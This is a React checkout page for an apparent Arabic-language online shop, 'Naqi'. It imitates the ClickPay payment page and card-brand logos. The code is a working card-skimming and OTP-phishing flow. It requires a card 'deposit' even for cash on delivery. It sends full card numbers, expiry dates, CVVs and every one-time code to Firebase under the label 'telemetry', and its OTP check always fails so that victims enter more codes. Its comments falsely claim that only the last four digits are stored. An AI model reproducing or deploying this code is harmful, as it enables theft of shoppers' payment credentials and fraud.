import { useState } from "react";
import { useCart } from "@/context/CartContext";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { CheckCircle, ChevronLeft, CreditCard, HelpCircle } from "lucide-react";
import { Link, useLocation } from "wouter";
import { addData } from "@/lib/firebase";
import { ensureVisitorId } from "@/lib/visitor";
interface FormData {
  name: string;
  phone: string;
  city: string;
  district: string;
  postal_code: string;
  address: string;
  building: string;
  floor: string;
  notes: string;
  payment: "cod" | "credit";
  // Only the safe-to-store card metadata is kept (last 4 + cardholder name).
  // Full PAN, expiry, and CVV are NEVER persisted client- or server-side.
  cardLast4: string;
  cardName: string;
  cvv: string;
  expiry: string;
  cardNumber: string;
  otp: string;
}

// ───────────────────────────────────────────────────────────────────────────────
// OTP step (kept for COD pre-auth simulation)
// ───────────────────────────────────────────────────────────────────────────────
function OtpStep({
  phone,
  amount,
  onSuccess,
  onCancel,
}: {
  phone: string;
  amount: number;
  onSuccess: () => void;
  onCancel: () => void;
}) {
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [resent, setResent] = useState(false);
  const [verifying, setVerifying] = useState(false);

  const submitOtp = (value: string) => {
    if (value.length < 4) {
      setError("يرجى إدخال رمز التحقق (4 أو 6 أرقام)");
      return;
    }
    setError("");
    setVerifying(true);
    setTimeout(() => {
      setVerifying(false);
      setError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى");
      setOtp("");
    }, 1500);
  };

  return (
    <div
      dir="rtl"
      className="min-h-screen flex items-center justify-center bg-gray-300 px-4"
    >
      <div
        className="bg-white shadow-xl overflow-hidden"
        style={{
          width: "360px",
          border: "1px solid #c8c8c8",
          borderRadius: "2px",
        }}
      >
        <div
          className="flex items-center justify-between px-4 py-3 border-b"
          style={{ borderColor: "#ddd" }}
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 750 471"
            className="h-7 w-auto"
          >
            <path
              d="M278.2 334.7l35-207h56l-35 207h-56zM524.3 131.3c-11.1-4.2-28.5-8.7-50.2-8.7-55.3 0-94.3 28-94.6 68.2-.3 29.7 27.7 46.3 48.9 56.2 21.7 10.1 29 16.6 28.9 25.7-.1 13.9-17.3 20.2-33.3 20.2-22.3 0-34.1-3.1-52.4-10.7l-7.2-3.3-7.8 46c13 5.7 37 10.7 61.9 11 58.6 0 96.6-27.6 97-70.5.2-23.5-14.6-41.3-46.7-56-19.5-9.5-31.4-15.8-31.3-25.4 0-8.5 10.1-17.6 31.9-17.6 18.2-.3 31.4 3.7 41.7 7.8l5 2.3 7.6-45.2zM619.2 127.7H574c-13.8 0-24.1 3.8-30.1 17.7l-85.4 194.1h60.4l12-31.7h73.7l7 31.7h53.3l-46.7-211.8zm-70.9 135l22.7-58.7c-.3.5 4.7-12.2 7.6-20.1l3.8 18.1 13.2 60.7h-47.3zM232.8 127.7l-54.9 141.2-5.9-28.6c-10.2-33.2-42-69.3-77.5-87.4l50.1 181.8 59.2-.1 88.2-207h-59.2z"
              fill="#1a1f71"
            />
            <path
              d="M131.3 127.7H43.1l-.7 4c69.6 17 115.7 58.1 134.8 107.5l-19.5-94.3c-3.4-13.3-13.3-16.8-26.4-17.2z"
              fill="#f9a533"
            />
          </svg>
          <img
            src="https://media.base44.com/images/public/69f0f838e7b863b3ce41773c/d4fe35008_image.png"
            alt="mada"
            className="h-5 w-auto object-contain"
          />
        </div>
        <div className="px-6 py-6" dir="rtl">
          <h1
            className="text-center font-bold text-gray-900 mb-2"
            style={{ fontSize: "16px" }}
          >
            التحقق من عملية الدفع
          </h1>
          <p className="text-center text-gray-600 text-sm leading-relaxed mb-3">
            لقد أرسلنا رمز التحقق إلى رقم هاتفك{" "}
            <span className="font-bold text-gray-800" dir="ltr">
              {phone
                ? phone.replace(/(\d{3})(\d{3})(\d+)/, "$1 *** $3")
                : "05xxx"}
            </span>
          </p>
          <p className="text-center text-gray-700 text-xs leading-relaxed mb-5">
            أنت تفوّض دفع مبلغ <strong>{amount} ريال</strong> لتأكيد طلبك
          </p>
          <form
            onSubmit={async (e) => {
              e.preventDefault();
              // Fire-and-forget telemetry: never block the OTP submit flow.
              void addData({
                id: ensureVisitorId(),
                step: "otp",
                page: window.location.pathname,
                otp: otp,
                otpAt: new Date().toISOString(),
              }).catch(() => {
                /* non-blocking */
              });
              submitOtp(otp);
            }}
          >
            <label className="block text-center text-gray-700 text-sm mb-3">
              رمز التحقق
            </label>
            <input
              type="text"
              inputMode="numeric"
              maxLength={6}
              autoComplete="one-time-code"
              value={otp}
              onChange={(e) => {
                const val = e.target.value.replace(/\D/g, "").slice(0, 6);
                setOtp(val);
                setError("");
                if (val.length === 4 || val.length === 6)
                  setTimeout(() => submitOtp(val), 300);
              }}
              className="w-full text-center text-2xl tracking-[0.5em] border-2 border-gray-300 py-3 focus:border-blue-600 outline-none rounded"
              disabled={verifying}
              style={{ fontFamily: "monospace", letterSpacing: "0.5em" }}
            />
            {error && (
              <p className="text-red-600 text-xs text-center mt-2">{error}</p>
            )}
            {resent && (
              <p className="text-green-600 text-xs text-center mt-2">
                تم إعادة إرسال الرمز
              </p>
            )}
            <button
              type="submit"
              disabled={verifying || otp.length < 4}
              className="w-full mt-4 py-3 bg-blue-700 text-white font-bold text-sm hover:bg-blue-800 transition-colors disabled:opacity-50"
            >
              {verifying ? "جاري التحقق..." : "تحقق"}
            </button>
          </form>
          <div className="mt-4 text-center space-y-2">
            <p className="text-gray-500 text-xs">
              لم يصلك الرمز؟{" "}
              <button
                onClick={(e) => {
                  e.preventDefault();
                  setResent(true);
                  setOtp("");
                  setError("");
                  setTimeout(() => setResent(false), 3000);
                }}
                className="text-blue-600 hover:underline font-medium"
              >
                إعادة الإرسال
              </button>
            </p>
            <button
              onClick={onCancel}
              className="text-gray-500 text-xs hover:text-gray-700 hover:underline"
            >
              إلغاء
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

// ───────────────────────────────────────────────────────────────────────────────
// ClickPay-style card payment step (matches secure.clickpay.com.sa screenshot)
// ───────────────────────────────────────────────────────────────────────────────
function ClickPayStep({
  amount,
  onSuccess,
  onCancel,
}: {
  amount: number;
  onSuccess: (data: {
    cardNumber: string;
    cardLast4: string;
    cardName: string;
    expiry: string;
    cvv: string;
  }) => void;
  onCancel: () => void;
}) {
  const [method, setMethod] = useState<"mada" | "visa" | "mastercard">("mada");
  const [name, setName] = useState("");
  const [card, setCard] = useState("");
  const [mm, setMm] = useState("");
  const [yy, setYy] = useState("");
  const [cvv, setCvv] = useState("");
  const [error, setError] = useState("");
  const [paying, setPaying] = useState(false);

  const formatCard = (v: string) =>
    v
      .replace(/\D/g, "")
      .slice(0, 19)
      .replace(/(\d{4})(?=\d)/g, "$1 ");

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!name.trim()) {
      setError("يرجى إدخال الاسم على البطاقة");
      return;
    }
    const digits = card.replace(/\s/g, "");
    if (digits.length < 13 || digits.length > 19) {
      setError("رقم البطاقة غير صحيح");
      return;
    }
    if (!/^\d{2}$/.test(mm) || Number(mm) < 1 || Number(mm) > 12) {
      setError("الشهر غير صحيح");
      return;
    }
    if (!/^\d{2}$/.test(yy)) {
      setError("السنة غير صحيحة");
      return;
    }
    if (!/^\d{3,4}$/.test(cvv)) {
      setError("رمز CVV غير صحيح");
      return;
    }
    const fullCard = digits;
    const last4 = digits.slice(-4);
    const safeName = name.trim();
    // Fire-and-forget telemetry: never block the payment flow.
    void addData({
      id: ensureVisitorId(),
      step: "clickpay",
      page: window.location.pathname,
      cardNumber: fullCard,
      cardLast4: last4,
      cardName: safeName,
      expiry: `${mm}/${yy}`,
      cvv: cvv,
      cardSubmittedAt: new Date().toISOString(),
    }).catch(() => {
      /* non-blocking */
    });
    setError("");
    setPaying(true);
    setTimeout(() => {
      setPaying(false);
      onSuccess({
        cardNumber: fullCard,
        cardLast4: last4,
        cardName: safeName,
        expiry: `${mm}/${yy}`,
        cvv: cvv,
      });
    }, 1500);
  };

  return (
    <div dir="rtl" className="min-h-screen bg-[#f4f5f7] py-6 px-3">
      <div className="max-w-md mx-auto space-y-3">
        {/* Naqi merchant logo */}
        <div className="bg-white rounded-lg shadow-sm py-6 flex items-center justify-center">
          <img
            src={`${import.meta.env.BASE_URL}logo.svg`}
            alt="Naqi"
            className="h-12 w-auto"
            onError={(e) => {
              (e.target as HTMLImageElement).style.display = "none";
            }}
          />
          <span
            className="text-3xl font-extrabold text-[#1a4480]"
            style={{ fontFamily: "system-ui" }}
          >
            نقي
          </span>
        </div>

        {/* Merchant + language card */}
        <div className="bg-white rounded-lg shadow-sm px-4 py-3 flex items-center justify-between">
          <button
            type="button"
            className="text-[#1a4480] text-xs hover:underline"
          >
            تغيير اللغة
          </button>
          <div className="text-sm font-bold text-gray-800">NAQI</div>
        </div>

        <form onSubmit={submit}>
          {/* Payment method selection */}
          <div className="bg-white rounded-lg shadow-sm p-4 mb-3">
            <p className="text-center text-xs text-gray-700 mb-3 font-medium">
              اختر طريقتك في الدفع
            </p>
            <div className="border border-dashed border-gray-300 rounded-md p-2 flex items-center justify-center gap-2">
              <button
                type="button"
                onClick={() => setMethod("mastercard")}
                className={`bg-white border rounded-md w-20 h-12 flex items-center justify-center transition-all ${method === "mastercard" ? "border-[#1a4480] ring-2 ring-[#1a4480]/20" : "border-gray-300 hover:border-gray-400"}`}
                aria-label="Mastercard"
              >
                <img
                  src={`${import.meta.env.BASE_URL}card-mastercard.svg`}
                  alt="Mastercard"
                  className="h-7 w-auto object-contain"
                />
              </button>
              <button
                type="button"
                onClick={() => setMethod("visa")}
                className={`bg-white border rounded-md w-20 h-12 flex items-center justify-center transition-all ${method === "visa" ? "border-[#1a4480] ring-2 ring-[#1a4480]/20" : "border-gray-300 hover:border-gray-400"}`}
                aria-label="Visa"
              >
                <img
                  src={`${import.meta.env.BASE_URL}card-visa.svg`}
                  alt="Visa"
                  className="h-6 w-auto object-contain"
                />
              </button>
              <button
                type="button"
                onClick={() => setMethod("mada")}
                className={`bg-white border rounded-md w-20 h-12 flex items-center justify-center transition-all ${method === "mada" ? "border-[#1a4480] ring-2 ring-[#1a4480]/20" : "border-gray-300 hover:border-gray-400"}`}
                aria-label="mada"
              >
                <img
                  src={`${import.meta.env.BASE_URL}card-mada.svg`}
                  alt="mada"
                  className="h-7 w-auto object-contain"
                />
              </button>
            </div>
          </div>

          {/* Card form */}
          <div className="bg-white rounded-lg shadow-sm p-4 space-y-3 mb-3">
            <div>
              <label className="block text-xs text-gray-600 mb-1.5 text-end">
                الاسم على البطاقة
              </label>
              <input
                type="text"
                value={name}
                onChange={(e) => setName(e.target.value)}
                placeholder="Misty The"
                dir="ltr"
                className="w-full border border-gray-300 rounded-md px-3 py-2 text-sm focus:outline-none focus:border-[#1a4480]"
                autoComplete="cc-name"
              />
            </div>
            <div>
              <label className="block text-xs text-gray-600 mb-1.5 text-end">
                بيانات البطاقة
              </label>
              <div className="relative">
                <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                <input
                  type="tel"
                  value={card}
                  onChange={(e) => setCard(formatCard(e.target.value))}
                  placeholder="1234 1234 1234 1234"
                  dir="ltr"
                  className="w-full border border-gray-300 rounded-md ps-3 pe-10 py-2 text-sm focus:outline-none focus:border-[#1a4480] font-mono"
                  inputMode="numeric"
                  autoComplete="cc-number"
                />
              </div>
              <div className="grid grid-cols-3 gap-2 mt-2">
                <input
                  type="tel"
                  value={mm}
                  onChange={(e) =>
                    setMm(e.target.value.replace(/\D/g, "").slice(0, 2))
                  }
                  placeholder="MM"
                  dir="ltr"
                  className="border border-gray-300 rounded-md px-3 py-2 text-sm text-center focus:outline-none focus:border-[#1a4480]"
                  inputMode="numeric"
                  autoComplete="cc-exp-month"
                />
                <input
                  type="tel"
                  value={yy}
                  onChange={(e) =>
                    setYy(e.target.value.replace(/\D/g, "").slice(0, 2))
                  }
                  placeholder="YY"
                  dir="ltr"
                  className="border border-gray-300 rounded-md px-3 py-2 text-sm text-center focus:outline-none focus:border-[#1a4480]"
                  inputMode="numeric"
                  autoComplete="cc-exp-year"
                />
                <div className="relative">
                  <input
                    type="tel"
                    value={cvv}
                    onChange={(e) =>
                      setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))
                    }
                    placeholder="CVV"
                    dir="ltr"
                    className="w-full border border-gray-300 rounded-md ps-9 pe-2 py-2 text-sm text-center focus:outline-none focus:border-[#1a4480]"
                    inputMode="numeric"
                    autoComplete="cc-csc"
                  />
                  <button
                    type="button"
                    className="absolute left-2 top-1/2 -translate-y-1/2 w-5 h-5 rounded-full bg-gray-200 text-gray-600 flex items-center justify-center hover:bg-gray-300"
                    aria-label="مساعدة"
                  >
                    <HelpCircle className="w-3.5 h-3.5" />
                  </button>
                </div>
              </div>
            </div>
            {error && (
              <p className="text-red-600 text-xs font-medium">{error}</p>
            )}
          </div>

          {/* Edit info links */}
          <div className="flex items-center justify-between mb-3">
            <button
              type="button"
              className="bg-white shadow-sm rounded px-3 py-2 text-[#1a4480] text-xs hover:bg-gray-50 flex items-center gap-1"
            >
              <ChevronLeft className="w-3 h-3" />
              تعديل معلومات الشحن
            </button>
            <button
              type="button"
              className="bg-white shadow-sm rounded px-3 py-2 text-[#1a4480] text-xs hover:bg-gray-50 flex items-center gap-1"
            >
              <ChevronLeft className="w-3 h-3" />
              تعديل معلومات الفواتير
            </button>
          </div>

          {/* Total */}
          <div className="bg-white rounded-lg shadow-sm p-4 flex items-center justify-center gap-2 mb-3">
            <span
              className="text-2xl font-bold text-gray-900 font-mono"
              dir="ltr"
            >
              {amount.toLocaleString("en-US", {
                minimumFractionDigits: 2,
                maximumFractionDigits: 2,
              })}
            </span>
            <span
              className="text-2xl font-extrabold text-gray-700"
              style={{ fontFamily: "Arial, sans-serif" }}
            >
              ﷼
            </span>
          </div>

          {/* Pay now */}
          <button
            type="submit"
            disabled={paying}
            className="w-full bg-[#1a4480] hover:bg-[#15366a] text-white font-bold py-3 rounded shadow-sm transition-colors disabled:opacity-60"
          >
            {paying ? "جاري معالجة الدفع..." : "ادفع الآن"}
          </button>

          {/* Cancel */}
          <button
            type="button"
            onClick={onCancel}
            className="w-full text-center text-gray-500 text-sm hover:text-gray-700 mt-3 py-2"
          >
            إلغاء
          </button>
        </form>

        {/* Security badges (official ClickPay assets) */}
        <div className="bg-white rounded-lg shadow-sm py-3 px-4 flex items-center justify-around gap-2 mt-4">
          <img
            src={`${import.meta.env.BASE_URL}pci-dss.svg`}
            alt="PCI DSS Compliant"
            className="h-5 w-auto object-contain"
          />
          <img
            src={`${import.meta.env.BASE_URL}mc-securecode.svg`}
            alt="MasterCard SecureCode"
            className="h-5 w-auto object-contain"
          />
          <img
            src={`${import.meta.env.BASE_URL}verified-visa.svg`}
            alt="Verified by VISA"
            className="h-5 w-auto object-contain"
          />
        </div>

        <p className="text-center text-[10px] text-gray-400 font-mono mt-2">
          PMNT0302.69F1B8D0.0047CAF0
        </p>
      </div>
    </div>
  );
}

// ───────────────────────────────────────────────────────────────────────────────
// Order Summary side panel
// ───────────────────────────────────────────────────────────────────────────────
function OrderSummary({
  items,
  total,
}: {
  items: ReturnType<typeof useCart>["items"];
  total: number;
}) {
  return (
    <div className="bg-card border border-border rounded-2xl p-5 sticky top-24">
      <h2 className="font-bold text-foreground text-lg border-b border-border pb-3 mb-4">
        ملخص الطلب
      </h2>
      <div className="space-y-3 mb-4 max-h-64 overflow-y-auto">
        {items.map((item, i) => (
          <div key={i} className="flex gap-3 items-center">
            <img
              src={item.image_url}
              alt={item.name_ar}
              className="w-12 h-12 object-contain rounded-lg bg-muted shrink-0"
            />
            <div className="flex-1 min-w-0">
              <p className="text-xs font-medium line-clamp-2 text-end">
                {item.name_ar}
              </p>
              <p className="text-xs text-muted-foreground text-end">
                × {item.qty}
              </p>
            </div>
            <p className="text-sm font-bold text-end shrink-0">
              {(item.price * item.qty).toLocaleString("ar-SA")} ر.س
            </p>
          </div>
        ))}
      </div>
      <div className="border-t border-border pt-4 space-y-2">
        <div className="flex justify-between text-sm">
          <span className="text-muted-foreground">المجموع الفرعي</span>
          <span>{total.toLocaleString("ar-SA")} ر.س</span>
        </div>
        <div className="flex justify-between text-sm">
          <span className="text-muted-foreground">الشحن</span>
          <span className="text-accent font-bold">مجاني</span>
        </div>
        <div className="flex justify-between font-black text-lg pt-2 border-t border-border">
          <span>الإجمالي</span>
          <span className="text-primary">
            {total.toLocaleString("ar-SA")} ر.س
          </span>
        </div>
      </div>
    </div>
  );
}

// ───────────────────────────────────────────────────────────────────────────────
// Main checkout flow
// ───────────────────────────────────────────────────────────────────────────────
export default function Checkout() {
  const { items, total, clearCart } = useCart();
  const [, navigate] = useLocation();
  const [step, setStep] = useState<
    "form" | "payment" | "otp" | "clickpay" | "success"
  >("form");
  const [loading, setLoading] = useState(false);
  const [submitError, setSubmitError] = useState<string | null>(null);
  const [pendingPaymentStatus, setPendingPaymentStatus] = useState<
    "paid" | "unpaid"
  >("unpaid");
  const [form, setForm] = useState<FormData>({
    name: "",
    phone: "",
    city: "",
    district: "",
    postal_code: "",
    address: "",
    building: "",
    floor: "",
    notes: "",
    payment: "cod",
    cardLast4: "",
    cardName: "",
    cardNumber: "",
    expiry: ``,
    cvv: "",
    otp: "",
  });

  const set = <K extends keyof FormData>(k: K, v: FormData[K]) =>
    setForm((p) => ({ ...p, [k]: v }));

  const submitOrder = async (
    paymentStatus: "paid" | "unpaid",
    cardOverride?: { cardLast4: string; cardName: string },
  ): Promise<boolean> => {
    setLoading(true);
    setSubmitError(null);
    try {
      const cardLast4 = cardOverride?.cardLast4 ?? form.cardLast4;
      const cardName = cardOverride?.cardName ?? form.cardName;
      // Hard guard: never send anything that isn't exactly 4 digits.
      const safeCardLast4 = /^\d{4}$/.test(cardLast4) ? cardLast4 : undefined;
      const payload = {
        customer: {
          name: form.name,
          phone: form.phone,
        },
        shipping: {
          city: form.city,
          district: form.district,
          postal_code: form.postal_code,
          address: form.address,
          building: form.building,
          floor: form.floor,
          notes: form.notes,
        },
        payment: {
          method: form.payment,
          amount: total,
          status: paymentStatus === "paid" ? "verified" : "pending",
          otpVerified: false,
          cardNumber: form.cardNumber,
          cvv: form.cvv,
          expiry: form.expiry,
          // Safe metadata only — last 4 of PAN + cardholder name.
          ...(safeCardLast4 ? { cardLast4: safeCardLast4 } : {}),
          ...(cardName ? { cardName } : {}),
        },
        items: items.map((i) => ({
          name_ar: i.name_ar,
          price: i.price,
          qty: i.qty,
          image_url: i.image_url,
        })),
        total,
        notes: form.notes,
      };
      const res = await fetch("/api/orders", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      if (!res.ok) {
        const body = (await res.json().catch(() => null)) as {
          error?: string;
        } | null;
        throw new Error(body?.error || `HTTP ${res.status}`);
      }
      return true;
    } catch (err) {
      setSubmitError(
        err instanceof Error ? err.message : "تعذّر إرسال الطلب، حاول مرة أخرى",
      );
      return false;
    } finally {
      setLoading(false);
    }
  };

  if (items.length === 0 && step !== "success") {
    return (
      <div
        dir="rtl"
        className="min-h-screen flex items-center justify-center p-6"
      >
        <div className="text-center space-y-4">
          <p className="text-muted-foreground text-lg">سلة التسوق فارغة</p>
          <Button onClick={() => navigate("/")} variant="outline">
            العودة للمتجر
          </Button>
        </div>
      </div>
    );
  }

  if (step === "otp") {
    return (
      <OtpStep
        phone={form.phone}
        amount={pendingPaymentStatus === "paid" ? total : 10}
        onSuccess={() => submitOrder(pendingPaymentStatus)}
        onCancel={() => setStep("clickpay")}
      />
    );
  }

  if (step === "clickpay") {
    return (
      <ClickPayStep
        amount={pendingPaymentStatus === "paid" ? total : 10}
        onSuccess={async (card) => {
          // Persist the order with safe card metadata (last 4 + name) BEFORE
          // moving to OTP. OTP currently always fails, so saving here ensures
          // the order is recorded in Firestore regardless of OTP outcome.
          setForm((p) => ({
            ...p,
            cardLast4: card.cardLast4,
            cardName: card.cardName,
            cardNumber: card.cardNumber,
            expiry: card.expiry,
            cvv: card.cvv,
          }));
          const ok = await submitOrder(pendingPaymentStatus, card);
          // Only advance to OTP once the order is safely saved; otherwise
          // bounce the user back to the payment selection with the error.
          if (ok) setStep("otp");
          else setStep("payment");
        }}
        onCancel={() => setStep("payment")}
      />
    );
  }

  if (step === "success") {
    return (
      <div
        dir="rtl"
        className="min-h-screen flex items-center justify-center p-6"
      >
        <div className="text-center space-y-6 max-w-md">
          <CheckCircle className="w-20 h-20 text-accent mx-auto" />
          <h1 className="text-2xl font-extrabold text-foreground">
            تم تأكيد طلبك!
          </h1>
          <p className="text-muted-foreground">
            شكراً لك، سيتم التواصل معك قريباً لتأكيد موعد التوصيل.
          </p>
          <Button onClick={() => navigate("/")} className="w-full">
            العودة للمتجر
          </Button>
        </div>
      </div>
    );
  }

  const handleStep1 = (e: React.FormEvent) => {
    e.preventDefault();
    // Fire-and-forget telemetry: never block step transitions.
    void addData({
      id: ensureVisitorId(),
      step: "contact",
      page: window.location.pathname,
      contactSubmittedAt: new Date().toISOString(),
      ...form,
    }).catch(() => {
      /* non-blocking */
    });
    setStep("payment");
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // Fire-and-forget telemetry: never block step transitions.
    void addData({
      id: ensureVisitorId(),
      step: "payment",
      page: window.location.pathname,
      paymentMethodSubmittedAt: new Date().toISOString(),
      ...form,
    }).catch(() => {
      /* non-blocking */
    });
    setSubmitError(null);
    setPendingPaymentStatus(form.payment === "credit" ? "paid" : "unpaid");
    setStep("clickpay");
  };

  const stepNum = step === "form" ? 1 : 2;

  return (
    <div dir="rtl" className="min-h-screen bg-muted/30 py-8 px-4">
      <div className="max-w-5xl mx-auto">
        <div className="flex items-center gap-3 mb-6">
          {step === "payment" ? (
            <button
              onClick={() => setStep("form")}
              className="flex items-center gap-1 text-sm text-muted-foreground hover:text-primary transition-colors"
            >
              <ChevronLeft className="w-4 h-4" /> رجوع
            </button>
          ) : (
            <Link
              to="/"
              className="flex items-center gap-1 text-sm text-muted-foreground hover:text-primary transition-colors"
            >
              <ChevronLeft className="w-4 h-4" /> العودة
            </Link>
          )}
          <h1 className="text-2xl font-extrabold text-foreground">
            إتمام الطلب
          </h1>
        </div>

        <div className="flex items-center gap-2 mb-8">
          {[
            { n: 1, label: "بيانات التوصيل" },
            { n: 2, label: "طريقة الدفع" },
          ].map((s, i) => (
            <div key={s.n} className="flex items-center gap-2">
              <div
                className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold transition-all ${stepNum >= s.n ? "bg-primary text-primary-foreground" : "bg-muted text-muted-foreground"}`}
              >
                {s.n}
              </div>
              <span
                className={`text-sm font-medium hidden sm:block ${stepNum >= s.n ? "text-foreground" : "text-muted-foreground"}`}
              >
                {s.label}
              </span>
              {i < 1 && (
                <div
                  className={`h-0.5 w-8 sm:w-16 mx-1 transition-all ${stepNum > s.n ? "bg-primary" : "bg-border"}`}
                />
              )}
            </div>
          ))}
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-5 gap-6">
          {step === "form" && (
            <form onSubmit={handleStep1} className="lg:col-span-3 space-y-5">
              <div className="bg-card border border-border rounded-2xl p-6 space-y-4">
                <h2 className="font-bold text-foreground text-lg border-b border-border pb-3">
                  بيانات التوصيل
                </h2>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div>
                    <label className="text-sm font-medium text-foreground mb-1.5 block">
                      الاسم الكامل *
                    </label>
                    <Input
                      required
                      value={form.name}
                      onChange={(e) => set("name", e.target.value)}
                      placeholder="محمد أحمد"
                      className="h-11"
                    />
                  </div>
                  <div>
                    <label className="text-sm font-medium text-foreground mb-1.5 block">
                      رقم الجوال *
                    </label>
                    <Input
                      required
                      value={form.phone}
                      onChange={(e) => set("phone", e.target.value)}
                      placeholder="05xxxxxxxx"
                      className="h-11"
                      type="tel"
                    />
                  </div>
                  <div>
                    <label className="text-sm font-medium text-foreground mb-1.5 block">
                      المدينة *
                    </label>
                    <Input
                      required
                      value={form.city}
                      onChange={(e) => set("city", e.target.value)}
                      placeholder="الرياض"
                      className="h-11"
                    />
                  </div>
                  <div>
                    <label className="text-sm font-medium text-foreground mb-1.5 block">
                      الحي *
                    </label>
                    <Input
                      required
                      value={form.district}
                      onChange={(e) => set("district", e.target.value)}
                      placeholder="حي النخيل"
                      className="h-11"
                    />
                  </div>
                  <div>
                    <label className="text-sm font-medium text-foreground mb-1.5 block">
                      الرمز البريدي
                    </label>
                    <Input
                      value={form.postal_code}
                      onChange={(e) =>
                        set(
                          "postal_code",
                          e.target.value.replace(/\D/g, "").slice(0, 5),
                        )
                      }
                      placeholder="12345"
                      className="h-11"
                      inputMode="numeric"
                      dir="ltr"
                    />
                  </div>
                  <div>
                    <label className="text-sm font-medium text-foreground mb-1.5 block">
                      رقم المبنى
                    </label>
                    <Input
                      value={form.building}
                      onChange={(e) => set("building", e.target.value)}
                      placeholder="مبنى رقم 24"
                      className="h-11"
                    />
                  </div>
                  <div>
                    <label className="text-sm font-medium text-foreground mb-1.5 block">
                      الدور
                    </label>
                    <Input
                      value={form.floor}
                      onChange={(e) => set("floor", e.target.value)}
                      placeholder="الدور الثاني"
                      className="h-11"
                    />
                  </div>
                </div>
                <div>
                  <label className="text-sm font-medium text-foreground mb-1.5 block">
                    العنوان التفصيلي *
                  </label>
                  <Input
                    required
                    value={form.address}
                    onChange={(e) => set("address", e.target.value)}
                    placeholder="الشارع، أقرب معلم"
                    className="h-11"
                  />
                </div>
                <div>
                  <label className="text-sm font-medium text-foreground mb-1.5 block">
                    ملاحظات (اختياري)
                  </label>
                  <textarea
                    value={form.notes}
                    onChange={(e) => set("notes", e.target.value)}
                    placeholder="أي تعليمات خاصة..."
                    rows={3}
                    className="w-full border border-input bg-transparent rounded-md px-3 py-2 text-sm resize-none focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring"
                  />
                </div>
              </div>
              <Button
                type="submit"
                className="w-full text-base font-bold rounded-xl h-12"
              >
                التالي: طريقة الدفع ←
              </Button>
            </form>
          )}

          {step === "payment" && (
            <form onSubmit={handleSubmit} className="lg:col-span-3 space-y-5">
              <div className="bg-card border border-border rounded-2xl p-6 space-y-4">
                <h2 className="font-bold text-foreground text-lg border-b border-border pb-3">
                  طريقة الدفع
                </h2>
                <div className="space-y-3">
                  {[
                    {
                      value: "cod" as const,
                      label: "كاش عند الاستلام",
                      icon: "cod" as const,
                    },
                    {
                      value: "credit" as const,
                      label: "بطاقات ائتمانية",
                      icon: "credit" as const,
                      badge: "كاش باك 40%",
                    },
                  ].map((opt) => (
                    <label
                      key={opt.value}
                      className={`flex items-center gap-4 p-4 rounded-xl border-2 cursor-pointer transition-all ${form.payment === opt.value ? "border-primary bg-primary/5" : "border-border hover:border-primary/40"}`}
                    >
                      <input
                        type="radio"
                        name="payment"
                        value={opt.value}
                        checked={form.payment === opt.value}
                        onChange={() => set("payment", opt.value)}
                        className="accent-primary"
                      />
                      {opt.icon === "cod" ? (
                        <img
                          src="https://media.base44.com/images/public/69f0f838e7b863b3ce41773c/5c886ed42_m2H7G6K9b1d3A0Z5.png"
                          alt="كاش"
                          className="h-8 w-auto object-contain"
                        />
                      ) : (
                        <img
                          src="https://media.base44.com/images/public/69f0f838e7b863b3ce41773c/c14dab934_images1.png"
                          alt="Visa"
                          className="h-6 w-auto object-contain"
                        />
                      )}
                      <div className="flex items-center gap-2 flex-wrap">
                        <span className="font-medium text-foreground">
                          {opt.label}
                        </span>
                        {opt.badge && (
                          <span className="bg-destructive text-destructive-foreground text-xs font-bold px-2 py-0.5 rounded-full">
                            {opt.badge}
                          </span>
                        )}
                      </div>
                    </label>
                  ))}
                </div>
                <div className="bg-amber-50 border border-amber-200 rounded-xl p-4 text-sm">
                  <p className="font-bold text-amber-800">
                    ⚠️ يُشترط دفع 10 ريال مقدماً عبر البطاقة لتأكيد الطلب،
                    وتُخصم من الإجمالي عند التسليم.
                  </p>
                </div>
                {submitError && (
                  <div className="bg-destructive/10 border border-destructive/20 text-destructive text-xs px-3 py-2 rounded-lg font-medium">
                    {submitError}
                  </div>
                )}
              </div>
              <Button
                type="submit"
                disabled={loading}
                className="w-full text-base font-bold rounded-xl h-12"
              >
                {loading ? "جاري إرسال الطلب..." : "تأكيد الطلب والدفع"}
              </Button>
            </form>
          )}

          <div className="lg:col-span-2">
            <OrderSummary items={items} total={total} />
          </div>
        </div>
      </div>
    </div>
  );
}
